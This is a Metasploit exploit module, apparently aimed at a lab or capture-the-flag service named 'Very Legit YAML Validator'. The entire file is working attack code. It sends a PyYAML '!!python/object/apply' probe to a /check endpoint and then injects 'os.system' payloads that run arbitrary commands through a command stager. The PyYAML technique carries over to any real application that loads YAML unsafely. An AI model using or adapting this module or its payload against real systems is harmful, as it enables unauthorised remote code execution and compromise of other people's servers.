class MetasploitModule < Msf::Exploit::Remote

  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Very Legit YAML Validator Remote Code Execution',
      'Description'    => %q{
          This module uses an insecure YAML validation with PyYAML to achieve remote code execution 
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'poptart <cale[at]hosakacorp.net>' 
        ],
      'References'     =>
        [
          ['URL', 'https://pyyaml.org/wiki/PyYAMLDocumentation'],
        ],
      'Platform'       => 'linux',
      'Arch'           => [ARCH_X86, ARCH_X64],
      'Targets'        =>
        [
          ['Automatic', {}]
        ],
      'Privileged'     => false,
      'DisclosureDate' => '2023-11-17',
      'DefaultTarget'  => 0
    ))

    register_options([Opt::RPORT(8000)])
  end

  def check
    begin
      res = send_request_cgi(
        'uri'    => normalize_uri(target_uri.path, '/check'),
        'method' => 'POST',
        'vars_form_data' => [
          {
            'name' =>'yaml', 
            'filename' => 'test.yml',
            'data' => '!!python/object/apply:builtins.range [1, 10, 1]'
          },
        ]

      )
    rescue Rex::ConnectionError
      vprint_error("#{peer} - Connection failed")
      return CheckCode::Unknown
    end

    if res && res.code == 200 && res.body.include?('valid, congrats')
      return CheckCode::Appears
    end

    CheckCode::Safe
  end

  def exploit
    print_status('Sending Command')
    execute_cmdstager
  end

  def execute_command(cmd, opts = {})

    # Modified from: https://swisskyrepo.github.io/PayloadsAllTheThingsWeb/Insecure%20Deserialization/YAML/
    res = send_request_cgi(
      'uri'    => normalize_uri(target_uri.path, '/check'),
      'method' => 'POST',
      'vars_form_data' => [
        {
          'name' =>'yaml', 
          'filename' => 'test.yml',
          'data' => '!!python/object/apply:os.system ["'+cmd.to_s.gsub(/"/, '\"')+' &"]'
        },
      ]
    )
  end
end
